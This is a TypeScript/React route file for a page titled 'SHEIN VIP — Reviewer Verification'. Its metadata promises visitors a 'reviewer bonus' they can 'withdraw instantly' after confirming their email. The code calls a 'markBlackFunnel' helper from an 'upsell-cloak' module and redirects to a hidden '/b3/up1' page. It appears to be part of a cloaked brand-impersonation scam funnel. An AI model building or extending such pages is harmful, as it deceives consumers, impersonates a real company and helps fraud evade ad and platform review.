import { createFileRoute } from "@tanstack/react-router";
import { useEffect } from "react";
import { BlackPage } from "@/components/up1/BlackPage";
import { markBlackFunnel } from "@/lib/upsell-cloak";
import { resolveLang } from "@/lib/reels-i18n";
import { useLang } from "@/lib/use-lang";

export const Route = createFileRoute("/up1")({
  validateSearch: (search: Record<string, unknown>) => search,
  loader: () => ({ lang: resolveLang() }),
  head: () => ({
    meta: [
      { title: "SHEIN VIP — Reviewer Verification" },
      {
        name: "description",
        content:
          "Confirm your email to release your reviewer bonus and withdraw instantly.",
      },
      { property: "og:title", content: "SHEIN VIP — Reviewer Verification" },
      {
        property: "og:description",
        content:
          "Confirm your email to release your reviewer bonus and withdraw instantly.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Up1Page,
});

function Up1Page() {
  const lang = useLang(Route.useLoaderData().lang);

  useEffect(() => {
    markBlackFunnel();
    if (typeof window !== "undefined") {
      window.location.replace("/b3/up1/index.html" + window.location.search);
    }
  }, []);

  return <BlackPage lang={lang} />;
}

